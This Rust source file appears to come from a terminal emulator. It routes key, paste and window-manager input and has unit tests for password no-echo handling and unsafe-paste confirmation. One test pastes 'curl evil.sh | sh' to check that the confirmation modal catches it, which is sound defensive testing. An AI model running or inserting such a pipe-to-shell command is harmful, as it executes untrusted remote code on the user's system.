pub mod encode;
pub mod keymap;
pub mod modal;
pub mod mouse;

pub use encode::{
    encode_alternate_scroll_wheel, encode_key_to_pty_bytes, encode_key_to_pty_bytes_full,
    encode_key_to_pty_bytes_with_modes,
};
pub use keymap::{is_leader_key, normalize_macos_option_key};
pub use mouse::{handle_mouse_event, handle_wm_mouse_event};

use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};

use crate::colon_command::{
    execute_colon_command, execute_wm_colon_command, parse_colon_command,
};
use crate::error::Result;
use crate::input::keymap::{
    handle_pane_alt_or_fkey_shortcut, handle_wm_leader_key, handle_wm_shortcut_key,
    handle_wm_user_binding_or_leader_entry,
};
use crate::input::modal::{
    handle_copy_mode_key, handle_fuzzy_search_key, handle_hints_mode_key,
    handle_history_popup_key, handle_unsafe_paste_modal_key, handle_wm_modal_key,
};
use crate::pane::CompositePane;
use crate::pty::line_discipline::InputRoutingMode;
use crate::vt::{is_unsafe_paste, sanitize_paste_bytes};
use crate::wm::WindowManager;

/// High-level application actions returned by the input router.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum AppAction {
    /// Continue running the event loop.
    Continue,
    /// User requested clean application exit (`Ctrl+Q` or `:quit`).
    Quit,
    /// Bytes were dispatched to the active pane's PTY (or floating prompt state mutated).
    Handled,
}

/// Routes a `crossterm::event::KeyEvent` for the active `CompositePane` (`PTY-02..04`, `PANE-01..05`).
pub fn handle_key_event(pane: &mut CompositePane, raw_key: KeyEvent) -> Result<AppAction> {
    pane.refresh_line_discipline();
    let key = normalize_macos_option_key(raw_key, true);

    // Global emergency quit: Ctrl+Q
    if key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('q') {
        return Ok(AppAction::Quit);
    }

    // If an unsafe raw PTY paste is awaiting user confirmation (FND-01), route keys to the modal first
    if pane.pending_unsafe_paste().is_some() {
        return handle_unsafe_paste_modal_key(pane, key);
    }

    // If keyboard-driven Vi Copy Mode is active on the OutputCanvas (VAL-04), route keys to it first
    if pane.copy_mode().active {
        return handle_copy_mode_key(pane, key);
    }

    // If QuickSelect 3270 Field Hints mode is active on the OutputCanvas (ECO-01), route keys to it first
    if pane.hints_mode().active {
        return handle_hints_mode_key(pane, key);
    }

    // If fuzzy history search is active, route keys to fuzzy search modal first
    if pane.is_prompt_visible() && pane.prompt().fuzzy_search.active {
        return handle_fuzzy_search_key(pane, key);
    }

    // If the Borland Command History Pop-up Window is open, route keys to it first
    if pane.is_prompt_visible() && pane.prompt().history_popup_open {
        return handle_history_popup_key(pane, key);
    }

    // Global manual toggle between CommandPrompt and RawPtyPassthrough: Ctrl+G or F12
    if (key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('g'))
        || key.code == KeyCode::F(12)
    {
        pane.toggle_manual_raw_override();
        return Ok(AppAction::Handled);
    }

    // Global 3-way mode cycle (Floating Prompt -> Fixed Prompt -> Regular Terminal -> Floating Prompt):
    // Active in CommandPrompt mode and in manual RegularTerminal mode (when not inside a DECSET 1049 ALT_SCREEN app like htop/vim)
    if !pane.vt().is_alternate_screen()
        && !pane.is_password_prompt()
        && (key.code == KeyCode::F(4)
            || (key.modifiers.contains(KeyModifiers::ALT)
                && matches!(key.code, KeyCode::Char('e') | KeyCode::Char('E'))))
    {
        pane.cycle_prompt_mode();
        return Ok(AppAction::Handled);
    }

    // When in RawPtyPassthrough (including DECSET 1049 alternate screen apps like vim/htop/emacs),
    // pass F1..F10 and Alt+<key> directly through to the child PTY instead of intercepting them!
    if pane.effective_routing_mode() == InputRoutingMode::RawPtyPassthrough {
        if pane.is_read_only() {
            pane.set_status_message(Some(
                "🔒 PROTECTED: Pane is locked read-only (:lock off or Ctrl+X l to unlock)"
                    .to_string(),
            ));
            return Ok(AppAction::Handled);
        }
        let bytes = encode_key_to_pty_bytes_full(
            raw_key,
            pane.vt().is_application_cursor(),
            pane.vt().is_backarrow_key_67(),
            pane.vt().kitty_keyboard_flags(),
        );
        if !bytes.is_empty() {
            pane.write_to_pty(&bytes)?;
        }
        return Ok(AppAction::Handled);
    }

    if let Some(action) = handle_pane_alt_or_fkey_shortcut(pane, key)? {
        return Ok(action);
    }

    handle_command_prompt_key(pane, key)
}

fn handle_command_prompt_key(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAction> {
    if key.modifiers.contains(KeyModifiers::SHIFT) {
        match key.code {
            KeyCode::Enter => {
                pane.prompt_mut().insert_newline();
                return Ok(AppAction::Handled);
            }
            KeyCode::PageUp => {
                pane.prompt_mut().scroll_up(2);
                return Ok(AppAction::Handled);
            }
            KeyCode::PageDown => {
                pane.prompt_mut().scroll_down(2);
                return Ok(AppAction::Handled);
            }
            _ => {}
        }
    }

    if key.modifiers.contains(KeyModifiers::CONTROL) {
        match key.code {
            KeyCode::Char('r') => {
                pane.prompt_mut().open_fuzzy_search();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('c') => {
                // If a foreground subcommand (e.g. `tail -f /dev/random`) is running or the prompt is empty,
                // forward SIGINT (0x03) to the PTY; also clear any partial prompt text and running banner.
                let has_fg_sub = pane.has_foreground_subcommand();
                let prompt_was_empty = pane.prompt().input.is_empty();
                pane.prompt_mut().running_command = None;
                if !prompt_was_empty {
                    pane.prompt_mut().clear_line();
                }
                if prompt_was_empty || has_fg_sub {
                    pane.write_to_pty(&[0x03])?;
                }
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('u') => {
                pane.prompt_mut().clear_line();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('k') => {
                pane.prompt_mut().kill_to_end_of_line();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('w') => {
                pane.prompt_mut().kill_prev_word();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('y') => {
                pane.prompt_mut().yank();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('z') => {
                pane.prompt_mut().undo();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('a') => {
                pane.prompt_mut().move_cursor_home();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('e') => {
                pane.prompt_mut().move_cursor_end();
                return Ok(AppAction::Handled);
            }
            KeyCode::Char('d') => {
                if pane.prompt().input.is_empty() {
                    pane.write_to_pty(&[0x04])?;
                } else {
                    pane.prompt_mut().delete_char();
                }
                return Ok(AppAction::Handled);
            }
            _ => {}
        }
    }

    match key.code {
        KeyCode::Enter => {
            let current_text = pane.prompt().text();
            // Check for in-prompt :command execution first (PANE-03, PANE-05)
            if let Some(cmd_res) = parse_colon_command(&current_text) {
                let _ = pane.prompt_mut().take_submission();
                match cmd_res {
                    Ok(cmd) => {
                        if execute_colon_command(pane, cmd) {
                            return Ok(AppAction::Quit);
                        }
                    }
                    Err(err_msg) => {
                        pane.set_status_message(Some(err_msg));
                    }
                }
                return Ok(AppAction::Handled);
            }

            if pane.is_read_only() {
                let _ = pane.submit_prompt();
                return Ok(AppAction::Handled);
            }

            pane.submit_prompt()?;
            Ok(AppAction::Handled)
        }
        KeyCode::Tab => {
            pane.complete_prompt_tab(key.modifiers.contains(KeyModifiers::SHIFT));
            Ok(AppAction::Handled)
        }
        KeyCode::BackTab => {
            pane.complete_prompt_tab(true);
            Ok(AppAction::Handled)
        }
        KeyCode::Esc => {
            pane.prompt_mut().completion.clear();
            Ok(AppAction::Handled)
        }
        KeyCode::Backspace => {
            pane.prompt_mut().backspace();
            Ok(AppAction::Handled)
        }
        KeyCode::Delete => {
            pane.prompt_mut().delete_char();
            Ok(AppAction::Handled)
        }
        KeyCode::Left => {
            pane.prompt_mut().move_cursor_left();
            Ok(AppAction::Handled)
        }
        KeyCode::Right => {
            pane.prompt_mut().move_cursor_right();
            Ok(AppAction::Handled)
        }
        KeyCode::Home => {
            pane.prompt_mut().move_cursor_home();
            Ok(AppAction::Handled)
        }
        KeyCode::End => {
            pane.prompt_mut().move_cursor_end();
            Ok(AppAction::Handled)
        }
        KeyCode::Up => {
            if !pane.prompt_mut().move_cursor_up() {
                pane.prompt_mut().history_prev();
            }
            Ok(AppAction::Handled)
        }
        KeyCode::Down => {
            if !pane.prompt_mut().move_cursor_down() {
                pane.prompt_mut().history_next();
            }
            Ok(AppAction::Handled)
        }
        KeyCode::PageUp => {
            pane.vt_mut().scroll_up(5);
            Ok(AppAction::Handled)
        }
        KeyCode::PageDown => {
            pane.vt_mut().scroll_down(5);
            Ok(AppAction::Handled)
        }
        KeyCode::Char(ch) => {
            pane.prompt_mut().insert_char(ch);
            Ok(AppAction::Handled)
        }
        _ => Ok(AppAction::Continue),
    }
}

/// Routes a `crossterm::event::Event::Paste` payload (`PTY-04`, `DECSET 2004`, `FND-01`).
///
/// - Always sanitizes dangerous C0/DEL control bytes via `sanitize_paste_bytes` (`FND-01`).
/// - In `CommandPrompt` mode: inserts sanitized text directly into `FloatingPromptState` without
///   auto-executing newlines so the user can inspect/edit pasted scripts before pressing `Enter`.
/// - In `RawPtyPassthrough` mode: checks `is_unsafe_paste` (unbracketed multi-line paste or embedded
///   `\x1b[201~` breakout) and stages `pending_unsafe_paste` for user confirmation when unsafe;
///   otherwise wraps in `\x1b[200~...\x1b[201~` if `DECSET 2004` is active or writes raw bytes.
pub fn handle_paste_event(pane: &mut CompositePane, pasted_text: &str) -> Result<AppAction> {
    pane.refresh_line_discipline();
    let sanitized = sanitize_paste_bytes(pasted_text);
    match pane.effective_routing_mode() {
        InputRoutingMode::CommandPrompt => {
            pane.prompt_mut().insert_str(&sanitized);
            Ok(AppAction::Handled)
        }
        InputRoutingMode::RawPtyPassthrough => {
            let bracketed = pane.vt().is_bracketed_paste();
            if is_unsafe_paste(pasted_text, bracketed) {
                pane.set_pending_unsafe_paste(Some(pasted_text.to_string()));
                pane.set_status_message(Some(
                    "UNSAFE MULTI-LINE PASTE DETECTED: Press [y/Enter] to confirm or [n/Esc] to cancel"
                        .to_string(),
                ));
                return Ok(AppAction::Handled);
            }
            if bracketed {
                let mut framed = Vec::with_capacity(sanitized.len() + 12);
                framed.extend_from_slice(b"\x1b[200~");
                framed.extend_from_slice(sanitized.as_bytes());
                framed.extend_from_slice(b"\x1b[201~");
                pane.write_to_pty(&framed)?;
            } else {
                pane.write_to_pty(sanitized.as_bytes())?;
            }
            Ok(AppAction::Handled)
        }
    }
}

/// Routes a `KeyEvent` across the multi-pane `WindowManager` (`WM-01..05`).
pub fn handle_wm_key_event(wm: &mut WindowManager, raw_key: KeyEvent) -> Result<AppAction> {
    let key = normalize_macos_option_key(raw_key, wm.config.macos_option_as_alt);

    // Global emergency quit: Ctrl+Q
    if key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('q') {
        return Ok(AppAction::Quit);
    }

    // Active WM modal overlays (Help, Inspector, Palette, Menu Bar)
    if let Some(action) = handle_wm_modal_key(wm, key)? {
        return Ok(action);
    }

    // If Prefix/Leader key (`Ctrl+X` by default) is awaiting the next chord, dispatch it across WM + Pane
    if wm.leader_pending {
        wm.leader_pending = false;
        wm.active_pane_mut().set_status_message(None);
        return handle_wm_leader_key(wm, key);
    }

    if let Some(action) = handle_wm_user_binding_or_leader_entry(wm, key) {
        return Ok(action);
    }

    // Refresh active pane line discipline before deciding whether F1..F10 / Alt+<key> should pass through to Raw PTY
    wm.active_pane_mut().refresh_line_discipline();
    let in_raw_passthrough = wm.active_pane().effective_routing_mode()
        == InputRoutingMode::RawPtyPassthrough
        && wm.active_pane().pending_unsafe_paste().is_none()
        && !wm.active_pane().copy_mode().active
        && !wm.active_pane().hints_mode().active;

    if in_raw_passthrough {
        return handle_key_event(wm.active_pane_mut(), raw_key);
    }

    // Global WM shortcuts (Palette, Quake, F1..F10, Alt-chords)
    if let Some(action) = handle_wm_shortcut_key(wm, key)? {
        return Ok(action);
    }

    // Intercept Enter on `:split`, `:deck`, `:focus`, `:zoom`, `:close`, `:layout`, `:quake`, or broadcast submissions
    if key.code == KeyCode::Enter
        && !key.modifiers.contains(KeyModifiers::SHIFT)
        && !key.modifiers.contains(KeyModifiers::ALT)
        && wm.active_pane().effective_routing_mode() == InputRoutingMode::CommandPrompt
        && !wm.active_pane().prompt().fuzzy_search.active
        && !wm.active_pane().copy_mode().active
        && !wm.active_pane().hints_mode().active
        && wm.active_pane().pending_unsafe_paste().is_none()
    {
        let text = wm.active_pane().prompt().text();
        if let Some(cmd_res) = parse_colon_command(&text) {
            let _ = wm.active_pane_mut().prompt_mut().take_submission();
            match cmd_res {
                Ok(cmd) => {
                    if execute_wm_colon_command(wm, cmd) {
                        return Ok(AppAction::Quit);
                    }
                }
                Err(err) => {
                    wm.active_pane_mut().set_status_message(Some(err));
                }
            }
            return Ok(AppAction::Handled);
        }

        // Synchronized Multi-Pane Input Broadcast (ECO-04): submit command to all non-locked workspace panes
        if wm.broadcast_input && !wm.active_pane().is_read_only() {
            let submitted = wm.active_pane_mut().prompt_mut().take_submission();
            for pane in wm.panes.values_mut() {
                if pane.is_read_only() {
                    continue;
                }
                pane.submit_command(&submitted)?;
            }
            return Ok(AppAction::Handled);
        }
    }

    handle_key_event(wm.active_pane_mut(), key)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::pane::PromptAnchor;
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    use ratatui::layout::Rect;

    #[test]
    fn password_keystrokes_in_no_echo_mode_never_leak_into_floating_prompt() {
        let mut pane = CompositePane::new_headless(1, 25, 80);
        // Simulate sudo password prompt (!ECHO)
        pane.line_discipline_mut().echo_enabled = false;
        assert_eq!(
            pane.effective_routing_mode(),
            InputRoutingMode::RawPtyPassthrough
        );

        for ch in "s3cr3tPass!".chars() {
            handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char(ch), KeyModifiers::NONE))
                .expect("route key");
        }
        // Floating prompt buffer MUST remain completely empty
        assert_eq!(pane.prompt().input, "");
    }

    #[test]
    fn command_prompt_edits_and_records_command_block_on_enter() {
        let mut pane = CompositePane::new_headless(1, 25, 80);
        for ch in "echo 3270".chars() {
            handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char(ch), KeyModifiers::NONE))
                .expect("type char");
        }
        assert_eq!(pane.prompt().input, "echo 3270");

        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE))
            .expect("press enter");
        assert_eq!(pane.prompt().input, "");
        assert_eq!(pane.prompt().history, vec!["echo 3270".to_string()]);
        assert_eq!(pane.vt().command_blocks().len(), 1);
        assert_eq!(pane.vt().command_blocks()[0].command, "echo 3270");
    }

    #[test]
    fn triple_modality_mouse_drag_resize_pin_and_colon_commands_work() {
        let mut pane = CompositePane::new_headless(1, 25, 80);
        let viewport = Rect::new(0, 0, 80, 25);

        // 1. Mouse drag top border from y=0 down to y=9 -> Floating { y_offset: 9 }
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Down(MouseButton::Left),
                column: 10,
                row: 0,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Drag(MouseButton::Left),
                column: 10,
                row: 9,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Up(MouseButton::Left),
                column: 10,
                row: 9,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        assert_eq!(pane.prompt().anchor, PromptAnchor::Floating { y_offset: 9 });

        // 2. Mouse drag bottom border of prompt (now at y = 9 + 2 = 11) down to y = 14 -> height = 6
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Down(MouseButton::Left),
                column: 10,
                row: 11,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Drag(MouseButton::Left),
                column: 10,
                row: 14,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Up(MouseButton::Left),
                column: 10,
                row: 14,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        assert_eq!(pane.prompt().height, 6);

        // 3. Click [▲] badge on top-right border (prompt_rect is x=1, width=78, right_edge=79, [▲] is at 71..74)
        handle_mouse_event(
            &mut pane,
            MouseEvent {
                kind: MouseEventKind::Down(MouseButton::Left),
                column: 72,
                row: 9,
                modifiers: KeyModifiers::NONE,
            },
            viewport,
        )
        .unwrap();
        assert_eq!(pane.prompt().anchor, PromptAnchor::Top);

        // 4. Paste multiline text into CommandPrompt without auto-executing
        handle_paste_event(&mut pane, "line1\nline2").unwrap();
        assert_eq!(pane.prompt().lines, vec!["line1".to_string(), "line2".to_string()]);
    }

    #[test]
    fn unsafe_raw_paste_triggers_confirmation_modal_and_kitty_csi_u_encodes_keys() {
        let mut pane = CompositePane::new_headless(1, 25, 80);
        pane.toggle_manual_raw_override();
        assert_eq!(pane.effective_routing_mode(), InputRoutingMode::RawPtyPassthrough);

        // Unbracketed multi-line paste in RawPtyPassthrough stages pending_unsafe_paste
        handle_paste_event(&mut pane, "curl evil.sh | sh\n").unwrap();
        assert!(pane.pending_unsafe_paste().is_some());

        // Pressing 'n' cancels the pending unsafe paste
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('n'), KeyModifiers::NONE)).unwrap();
        assert!(pane.pending_unsafe_paste().is_none());

        // Kitty keyboard CSI u encoding
        let shift_enter = encode_key_to_pty_bytes_full(
            KeyEvent::new(KeyCode::Enter, KeyModifiers::SHIFT),
            false,
            false,
            1,
        );
        assert_eq!(shift_enter, b"\x1b[13;2u");
        let ctrl_a = encode_key_to_pty_bytes_full(
            KeyEvent::new(KeyCode::Char('a'), KeyModifiers::CONTROL),
            false,
            false,
            1,
        );
        assert_eq!(ctrl_a, b"\x1b[97;5u");
    }

    #[test]
    fn decset_1007_alternate_scroll_and_vi_copy_mode_rectangular_selection_work() {
        let mut pane = CompositePane::new_headless(1, 10, 40);
        pane.process_pty_output(b"\x1b[?1049h\x1b[?1h");
        let up_bytes = encode_alternate_scroll_wheel(&pane, MouseEventKind::ScrollUp).unwrap();
        assert_eq!(up_bytes, b"\x1bOA\x1bOA\x1bOA");

        pane.process_pty_output(b"\x1b[?1049l");
        pane.process_pty_output(b"ABCD1234\r\nEFGH5678\r\nIJKL9012\r\n");

        // Enter Vi Copy Mode and select a 2x4 rectangular block ("1234\n5678")
        pane.enter_copy_mode();
        pane.copy_mode_mut().cursor_row = 0;
        pane.copy_mode_mut().cursor_col = 4;
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('b'), KeyModifiers::NONE)).unwrap();
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Down, KeyModifiers::NONE)).unwrap();
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE)).unwrap();

        assert!(!pane.copy_mode().active);
        assert_eq!(pane.prompt().yank_buffer, "1234\n5678");
        assert!(pane.last_osc52_sequence().is_some());
    }

    #[test]
    fn macos_option_unicode_normalization_leader_prefix_readline_and_raw_passthrough_work() {
        let mut wm = WindowManager::new_headless(24, 80);

        // 1. macOS Option+<key> Unicode characters (e.g. Option+V -> '√', Option+H -> '˙', Option+1 -> '¡')
        //    automatically normalize to Alt+<key> and trigger WM splits & pane focus!
        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('√'), KeyModifiers::NONE))
            .unwrap();
        assert_eq!(wm.panes.len(), 2);

        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('¡'), KeyModifiers::NONE))
            .unwrap();
        assert_eq!(wm.active_pane_id(), 1);

        // 2. Leader prefix (`Ctrl+X`) works for splits, zoom, copy mode, prompt docking, quake, and help
        handle_wm_key_event(
            &mut wm,
            KeyEvent::new(KeyCode::Char('x'), KeyModifiers::CONTROL),
        )
        .unwrap();
        assert!(wm.leader_pending);
        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('z'), KeyModifiers::NONE))
            .unwrap();
        assert!(!wm.leader_pending);
        assert_eq!(wm.zoomed_pane, Some(1));

        // Unzoom via Leader + z
        handle_wm_key_event(
            &mut wm,
            KeyEvent::new(KeyCode::Char('x'), KeyModifiers::CONTROL),
        )
        .unwrap();
        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('z'), KeyModifiers::NONE))
            .unwrap();
        assert_eq!(wm.zoomed_pane, None);

        // Pin prompt to Bottom via Leader + b
        handle_wm_key_event(
            &mut wm,
            KeyEvent::new(KeyCode::Char('x'), KeyModifiers::CONTROL),
        )
        .unwrap();
        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('b'), KeyModifiers::NONE))
            .unwrap();
        assert_eq!(wm.active_pane().prompt().anchor, PromptAnchor::Bottom);

        // Toggle Quake terminal via macOS-safe Ctrl+\
        handle_wm_key_event(
            &mut wm,
            KeyEvent::new(KeyCode::Char('\\'), KeyModifiers::CONTROL),
        )
        .unwrap();
        assert!(wm.quick_terminal.visible);
        handle_wm_key_event(
            &mut wm,
            KeyEvent::new(KeyCode::Char('\\'), KeyModifiers::CONTROL),
        )
        .unwrap();
        assert!(!wm.quick_terminal.visible);

        // 3. Readline word navigation (Alt+b / Option+Left, Alt+f / Option+Right, Alt+Backspace, Alt+d)
        //    in CommandPrompt does NOT move the prompt box or trigger hints when text is present
        wm.active_pane_mut().set_prompt_anchor(PromptAnchor::Top);
        wm.active_pane_mut().prompt_mut().set_text("cargo build --release");
        assert_eq!(wm.active_pane().prompt().cursor_col, 21);

        // Option+Left (`Alt+b` or macOS `'∫'`) moves word left to "--release" (col 12), keeping PromptAnchor::Top!
        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('∫'), KeyModifiers::NONE))
            .unwrap();
        assert_eq!(wm.active_pane().prompt().cursor_col, 12);
        assert_eq!(wm.active_pane().prompt().anchor, PromptAnchor::Top);

        // Another Alt+b moves to "build" (col 6)
        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('b'), KeyModifiers::ALT))
            .unwrap();
        assert_eq!(wm.active_pane().prompt().cursor_col, 6);

        // Option+Right (`Alt+f` or macOS `'ƒ'`) moves word right to "--release" (col 12), without entering hints_mode!
        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('ƒ'), KeyModifiers::NONE))
            .unwrap();
        assert_eq!(wm.active_pane().prompt().cursor_col, 12);
        assert!(!wm.active_pane().hints_mode().active);

        // Alt+Backspace deletes previous word ("build ")
        handle_wm_key_event(
            &mut wm,
            KeyEvent::new(KeyCode::Backspace, KeyModifiers::ALT),
        )
        .unwrap();
        assert_eq!(wm.active_pane().prompt().text(), "cargo --release");

        // Alt+d deletes next word ("--release")
        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('d'), KeyModifiers::ALT))
            .unwrap();
        assert_eq!(wm.active_pane().prompt().text(), "cargo ");

        // 4. In RawPtyPassthrough / ALT_SCREEN (e.g. htop, vim, emacs), F1..F10 and Alt+<key> pass through
        //    to the child app instead of being intercepted by the WM, while Ctrl+X <key> still controls the WM!
        wm.active_pane_mut().process_pty_output(b"\x1b[?1049h");
        assert_eq!(
            wm.active_pane().effective_routing_mode(),
            InputRoutingMode::RawPtyPassthrough
        );
        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::F(1), KeyModifiers::NONE)).unwrap();
        assert!(!wm.help_visible);
        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::F(10), KeyModifiers::NONE)).unwrap();
        assert!(!wm.quick_terminal.visible);
        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('v'), KeyModifiers::ALT))
            .unwrap();
        assert_eq!(wm.panes.len(), 2);

        // Leader Ctrl+X ? still opens Help even from inside ALT_SCREEN!
        handle_wm_key_event(
            &mut wm,
            KeyEvent::new(KeyCode::Char('x'), KeyModifiers::CONTROL),
        )
        .unwrap();
        handle_wm_key_event(&mut wm, KeyEvent::new(KeyCode::Char('?'), KeyModifiers::NONE))
            .unwrap();
        assert!(wm.help_visible);
    }
}
